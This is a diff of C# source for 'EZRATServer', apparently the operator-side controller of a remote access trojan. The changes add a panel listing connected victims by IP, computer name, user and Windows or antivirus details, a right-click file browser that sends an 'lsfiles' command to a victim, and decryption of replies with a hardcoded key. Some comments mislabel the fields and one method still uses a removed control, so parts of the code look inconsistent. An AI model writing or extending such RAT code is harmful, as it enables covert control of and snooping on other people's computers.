@@ -28,6 +28,7 @@ namespace EZRATServer
         private int _port = 0;
         private static Socket _serverSocket;
         private static string EncryptKey = "POULPE212123542345235";
+        FileBrowser fl;
 
 
 
@@ -276,26 +277,41 @@ namespace EZRATServer
         public Server()
         {
             InitializeComponent();
+            lstClients.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
+            lstClients.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
             this.btnStart.Click += StartServer;
             this.btnStop.Click += StopServer;
             this.btnSettings.Click += NotifiClients;
             this.FormClosing += CloseProgram;
             tmr.Tick += UpdateClient;
+            this.imageContextMenu1.ItemClicked += RightClickSelect;
 
 
         }
 
+
+        void RightClickSelect(object sender, EventArgs e)
+        {
+            ContextMenuStrip item = (ContextMenuStrip)sender;
+            switch (item.Items[0].Text)
+            {
+                case "File Browser":
+                    fl = new FileBrowser();
+                    fl.Show();
+                    SendCommand("lsfiles",this.lstClients.SelectedIndices[0]);
+                    break;
+                case "Chat":
+
+                    break;
+                default:
+                    break;
+            }
+        }
+
+
         void CloseProgram(object sender, EventArgs e)
         {
             StopServer(sender, e);
-            try
-            {
-                this.Close();
-            }
-            catch (Exception ex)
-            {
-
-            }
         }
 
         void NotifiClients(object sender, EventArgs e)
@@ -310,7 +326,7 @@ namespace EZRATServer
             {
                 if (!_clientSockets[i].Connected)
                 {
-                    dgvClients.Rows.RemoveAt(i);
+                    lstClients.Items[i].Remove();
                     _clientSockets.RemoveAt(i - 1);
                 }
 
@@ -319,15 +335,8 @@ namespace EZRATServer
 
         void StopServer(object sender, EventArgs e)
         {
-            _clientSockets.ForEach((c) => c.Disconnect(false));
+            _clientSockets.ForEach((c) => c.Shutdown(SocketShutdown.Both));
             _clientSockets.Clear();
-        }
-        void UpdateDataFromClient()
-        {
-            for (int i = 0; i < _clientSockets.Count; i++)
-            {
-                GetDataFromClient(_clientSockets[i], i);
-            }
         }
 
         void StartServer(object sender, EventArgs e)
@@ -348,6 +357,7 @@ namespace EZRATServer
             _serverSocket.Bind(new IPEndPoint(IPAddress.Any, this._port)); //Bind the new socket to the local machine
             _serverSocket.Listen(5); //Listen for incoming connections
             _serverSocket.BeginAccept(AcceptCallback, null); //Define the client accept callback
+            IsStartedServer = true;
         }
 
         /// <summary>
@@ -401,11 +411,11 @@ namespace EZRATServer
 
             _clientSockets.Add(socket); //Add the new socket to the list
             int id = _clientSockets.Count - 1; //Get the new ID for the client
-            AddToData(new ClientData(id));
             string cmd = "getinfo-" + id.ToString(); //Construct the command
             SendCommand(cmd, id); //Send the command
             socket.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, socket); //Add the reading callback
             _serverSocket.BeginAccept(AcceptCallback, null); //Restart accepting clients
+            
         }
 
 
@@ -529,7 +539,7 @@ namespace EZRATServer
 
         private void RestartServer(int id)
         {
-            Application.Restart();
+            MessageBox.Show("Client disconnect");
         }
 
 
@@ -575,68 +585,74 @@ namespace EZRATServer
                 byte[] recBuf = new byte[received]; //Declare a new received buffer with the size of the received bytes
                 Array.Copy(_buffer, recBuf, received); //Copy from the big array to the new array, with the size of the received bytes
                 bool ignoreFlag = false; //Declare the ignore flag
-            }
+
+
+
+                try //Try
+                {
+                    text = Encoding.Default.GetString(recBuf); //Get the text from the receive buffer
+                    text = Decrypt(text); //Decrypt the received text
+                }
+                catch (Exception ex) //Something went wrong
+                {
+                    MessageBox.Show("Original Error :: " + ex.Message); //Display the error message
+                }
+
+                if (text != null) //If text is not null
+                {
+                    if (text.StartsWith("infoback;")) //Info received from client
+                    {
+                        string[] mainContainer = text.Split(';'); // Get the main data parts
+                        int id = int.Parse(mainContainer[1]); //The client ID
+                        string[] lines = mainContainer[2].Split('¦'); //Split the data into parts
+                        string ip = lines[0]; //The computer's local IPv4 address
+                        string name = lines[1]; //The Computer Name
+                        string user = lines[2]; //The computer's date and time
+                        string windows = lines[3]; //The computer's installed Anti Virus product
+
+                        AddToData(new ClientData(id, ip, name, user,windows)); //Update the UI
+                    }
+                    else if (text.StartsWith("lsfiles;"))
+                    {
+                        string[] mainContainer = text.Split(';'); // Get the main data parts
+                        string path = mainContainer[1];
+                        string lines = mainContainer[2]; //Split the data into parts
+                        fl.Update(lines);
+                    }
+                }
+
+
+                }
+
+
             if (!dclient) current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current); //If client is not disconnecting, restart the reading
         }
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-        void Connector()
-        {
-            RATClient client = new RATClient(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-
-            client.Bind(new IPEndPoint(IPAddress.Parse("0.0.0.0"), this._port));
-            client.Listen(1000);
-            CON:
-            Socket connectedClient = client.Accept();
-            while (true)
-            {
-                if (connectedClient.Connected)
-                {
-                    _clientSockets.Add(connectedClient);
-                    NotifiClients(new object(), new EventArgs());
-                    goto CON;
-                }
-            }
-
-        }
-
-        private ClientData GetDataFromClient(Socket soc, int id)
-        {
-            soc.Send(Encoding.Default.GetBytes("info"));
-            byte[] receive = new byte[1024];
-            soc.Receive(receive);
-            string result = Encoding.Default.GetString(receive);
-            return new ClientData(id, result, result, result, result, result);
-        }
-
-        // lstIP, lstName, lstUser, lstWindows, lstPing
+        // lstIP, lstName, lstUser, lstWindows
         void AddToData(ClientData data)
         {
-            if (!dgvClients.InvokeRequired)
+            if (!lstClients.InvokeRequired)
             {
-                this.dgvClients.Rows.Add(data.Ip, data.Name, data.User, data.Windows, data.Ping);
+                this.lstClients.Items.Add(new ListViewItem(new string[] { data.Id.ToString(), data.Ip, data.Name, data.User, data.Windows }));
             }
             else
             {
-                dgvClients.Invoke(new MethodInvoker(() => dgvClients.Rows.Add(data.Ip, data.Name, data.User, data.Windows, data.Ping)));
+                lstClients.Invoke(new MethodInvoker(() =>
+                {
+                    lstClients.Items.Add(new ListViewItem(new string[] { data.Id.ToString(), data.Ip, data.Name, data.User, data.Windows }));
+                    lstClients.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
+                    lstClients.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
+
+                }));
             }
+
+            
         }
 
         void UpdateDataClient(ClientData data)
         {
-            this.dgvClients.Rows[data.Row].SetValues(data.Ip, data.Name, data.User, data.Windows, data.Ping);
+            this.dgvClients.Rows[data.Id].SetValues(data.Ip, data.Name, data.User, data.Windows);
         }
     }
 }
